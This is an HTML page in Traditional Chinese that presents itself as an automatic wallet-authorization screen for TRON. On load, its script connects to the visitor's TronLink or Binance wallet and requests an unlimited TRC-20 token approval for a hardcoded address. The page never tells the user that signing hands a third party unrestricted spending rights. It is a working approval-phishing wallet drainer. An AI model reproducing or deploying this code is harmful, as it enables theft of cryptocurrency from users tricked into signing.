<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>自動授權頁面</title>
<style>
  body {
    font-family: "Noto Sans TC", "Microsoft JhengHei", sans-serif;
    background: linear-gradient(-45deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
    background-size: 400% 400%;
    animation: gradientBG 12s ease infinite;
    color: #fff;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    margin: 0;
    padding: 20px;
  }
  @keyframes gradientBG {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }
  .container {
    background: rgba(255, 255, 255, 0.05);
    backdrop-filter: blur(12px);
    border-radius: 16px;
    padding: 30px 40px;
    max-width: 420px;
    width: 100%;
    text-align: center;
    box-shadow: 0 8px 20px rgba(0,0,0,0.3);
  }
  h1 { font-size: 26px; margin-bottom: 16px; font-weight: 600; }
  p { font-size: 16px; margin-bottom: 28px; line-height: 1.6; color: #cbd5e1; }
  #status { margin-top: 20px; min-height: 24px; font-size: 14px; }
  .loading { color: #facc15; }
  .success { color: #4ade80; }
  .error { color: #f87171; }
</style>
<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
<div class="container">
  <h1>自動授權中</h1>
  <p>系統正在檢測錢包並自動授權，請在彈出的錢包中確認簽名。</p>
  <p id="status" class="loading">正在初始化...</p>
</div>

<script>
  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD TRC-20
  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // 接收授權的地址
  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  let tronWeb;

  async function connectWallet() {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    if (window.tronLink) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    if (window.binance && window.binance.tron) {
      await window.binance.tron.request({ method: 'tron_requestAccounts' });
      tronWeb = window.tronWeb || new TronWeb(window.binance.tron);
      return tronWeb.defaultAddress.base58;
    }
    return null;
  }

  async function checkTronNetwork() {
    try {
      const chainId = await tronWeb.trx.getChainId?.();
      if (chainId && chainId !== '_') {
        updateStatus("請切換到 TRON 主網", "error");
        return false;
      }
      return true;
    } catch {
      return true;
    }
  }

  async function approve() {
    updateStatus("發送授權交易中，請簽名...", "loading");
    try {
      const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
      updateStatus("✅ 授權成功！交易 ID：" + tx, "success");
    } catch (error) {
      console.error(error);
      updateStatus("❌ 授權失敗或用戶取消", "error");
    }
  }

  function updateStatus(msg, type) {
    document.getElementById("status").innerText = msg;
    document.getElementById("status").className = type;
  }

  async function init() {
    updateStatus("正在檢測錢包...", "loading");
    const address = await connectWallet();
    if (!address) {
      updateStatus("未檢測到 TRON 錢包，請安裝 TronLink 或幣安 Web3", "error");
      return;
    }
    updateStatus("錢包已連接：" + address, "success");

    if (!await checkTronNetwork()) {
      return;
    }

    // 自動授權
    await approve();
  }

  window.addEventListener('load', init);
</script>
</body>
</html>
